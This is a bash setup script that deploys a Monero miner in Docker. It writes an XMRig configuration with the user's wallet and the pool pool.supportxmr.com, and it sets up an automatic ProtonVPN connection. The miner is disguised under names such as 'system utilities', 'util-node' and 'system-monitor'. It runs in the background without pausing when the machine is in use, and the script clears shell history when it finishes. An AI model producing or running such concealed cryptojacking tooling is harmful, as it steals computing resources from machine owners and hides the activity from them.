#!/bin/bash
# Setup script - Run after cloning: ./setup.sh <WALLET> <PROTON_USER> <PROTON_PASS>

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

# Parse arguments
WALLET="$1"
PROTON_USER="$2"
PROTON_PASS="$3"

# Validate arguments
if [ -z "$WALLET" ] || [ -z "$PROTON_USER" ] || [ -z "$PROTON_PASS" ]; then
    echo -e "${RED}Usage: ./setup.sh <WALLET> <PROTON_USER> <PROTON_PASS>${NC}"
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "${SCRIPT_DIR}"

echo -e "${GREEN}[*] Setting up system utilities...${NC}"

# Install Docker if not present
if ! command -v docker &> /dev/null; then
    echo -e "${GREEN}[*] Installing Docker...${NC}"
    curl -fsSL https://get.docker.com | sh
    systemctl enable docker
    systemctl start docker
fi

# Create config directory
mkdir -p config scripts

# Generate network.sh with credentials
cat > scripts/network.sh << NETWORK
#!/bin/bash
MAX_RETRIES=3
RETRY_COUNT=0

PVPN_USER="${PROTON_USER}"
PVPN_PASS="${PROTON_PASS}"

connect_vpn() {
    expect << EOF
spawn protonvpn init
expect "Enter your ProtonVPN OpenVPN username:"
send "\${PVPN_USER}\r"
expect "Enter your ProtonVPN OpenVPN password:"
send "\${PVPN_PASS}\r"
expect "Enter your plan*"
send "1\r"
expect eof
EOF
    
    protonvpn connect --fastest
    return \$?
}

while [ \$RETRY_COUNT -lt \$MAX_RETRIES ]; do
    if connect_vpn; then
        sleep 5
        if protonvpn status | grep -q "Connected"; then
            exit 0
        fi
    fi
    RETRY_COUNT=\$((RETRY_COUNT + 1))
    sleep 10
done

exit 1
NETWORK

# Generate preferences.json with wallet
cat > config/preferences.json << PREFERENCES
{
    "autosave": false,
    "background": true,
    "colors": false,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 75,
        "asm": true,
        "argon2-impl": null
    },
    "log-file": null,
    "donate-level": 0,
    "donate-over-proxy": 0,
    "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "pool.supportxmr.com:3333",
            "user": "${WALLET}",
            "pass": "x",
            "rig-id": "util-node",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "sni": false,
            "daemon": false
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 0,
    "health-print-time": 0,
    "dmi": false,
    "syslog": false,
    "verbose": 0,
    "watch": false,
    "pause-on-battery": false,
    "pause-on-active": false
}
PREFERENCES

# Make scripts executable
chmod +x scripts/*.sh entrypoint.sh

echo -e "${GREEN}[*] Building container...${NC}"
docker compose build --quiet 2>/dev/null || docker-compose build --quiet

echo -e "${GREEN}[*] Starting system utilities...${NC}"
docker compose up -d 2>/dev/null || docker-compose up -d

# Clear history
history -c 2>/dev/null || true

echo -e "${GREEN}[✓] Setup complete!${NC}"
echo -e "${GREEN}[*] Check status: docker ps | grep system-monitor${NC}"
